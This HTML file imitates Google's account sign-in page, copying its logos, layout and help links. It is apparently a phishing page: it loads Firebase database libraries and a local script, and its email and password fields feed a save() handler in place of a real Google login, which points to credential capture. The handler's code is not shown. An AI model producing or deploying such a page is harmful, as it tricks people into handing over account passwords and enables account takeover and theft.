<!DOCTYPE html>
<html lang="en">

<head>
  <script src="https://www.gstatic.com/firebasejs/4.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/4.10.1/firebase-database.js"></script>
  <script src="https://www.gstatic.com/firebasejs/live/3.0/firebase.js"></script>
  <script src="https://www.gstatic.com/firebasejs/4.13.0/firebase.js"></script>
  <script src="/scripts/index.js"></script>

  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <title>Sign in - Google Accounts</title>

  <link href="/styles/1.css" rel="stylesheet" type="text/css">
  <link href="/styles/2.css" rel="stylesheet" type="text/css" media="screen and (max-width: 800px), screen and (max-height: 800px)">
  <link href="/styles/3.css" rel="stylesheet" type="text/css" media="screen and (max-width: 580px)">
  <link href="/styles/4.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400&lang=en" rel="stylesheet" type="text/css">
  <link href="/styles/5.css" rel="stylesheet" type="text/css">
  <link href="/styles/6.css" rel="stylesheet" type="text/css">
  <link href="/styles/7.css" rel="stylesheet" type="text/css" media="screen and (max-width: 800px), screen and (max-height: 800px)">
  <link href="/styles/8.css" rel="stylesheet" type="text/css" media="screen and (max-width: 580px)">
  <link href="/styles/9.css" rel="stylesheet" type="text/css">
  <link href="/styles/10.css" rel="stylesheet" type="text/css" media="screen and (max-width: 580px)">
  <link href="/styles/11.css" rel="stylesheet" type="text/css">
  <link href="/styles/12.css" rel="stylesheet" type="text/css" media="screen and (max-width: 800px), screen and (max-height: 800px)">
</head>

<body>
  <div class="wrapper">
    <div class="google-header-bar centered">
      <div class="header content clearfix">
        <img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"> </div>
    </div>
    <div class="main content clearfix">
      <div class="banner">
        <h2> Sign in with your Google Account </h2>
      </div>
      <div class="card signin-card clearfix">
        <div id="cc_iframe_parent"></div>
        <img class="profile-img" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
        <p class="profile-name"></p>
        <form>
          <label class="hidden-label" for="Email">Email</label>
          <input id="a" type="text" placeholder="Email">
          <label class="hidden-label" for="Passwd">Password</label>
          <input id="b" type="password" placeholder="Password">
          <input class="rc-button rc-button-submit" value="Sign in" onclick="save();">
          <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=lso&continue=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%25E2%2588%2599APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX">
          Need help? </a>
        </form>
      </div>
      <div class="one-google">
        <p class="create-account">
          <a id="link-signup" href="https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default&flowName=GlifWebSignIn&flowEntry=SignUp">
          Create an account </a>
        </p>
        <p class="tagline"> One Google Account for everything Google </p>
        <img src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" width="210"
          height="17" alt=""> </div>
    </div>
    <div class="google-footer-bar">
      <div class="footer content clearfix">
        <ul id="footer-list">
          <li> Google </li>
          <li>
            <a href="TOS-loc=US&hl=en.html" target="_blank"> Privacy &amp; Terms </a>
          </li>
          <li>
            <a href="http://www.google.com/support/accounts?hl=en" target="_blank"> Help </a>
          </li>
        </ul>
      </div>
    </div>
  </div>
</body>

</html>
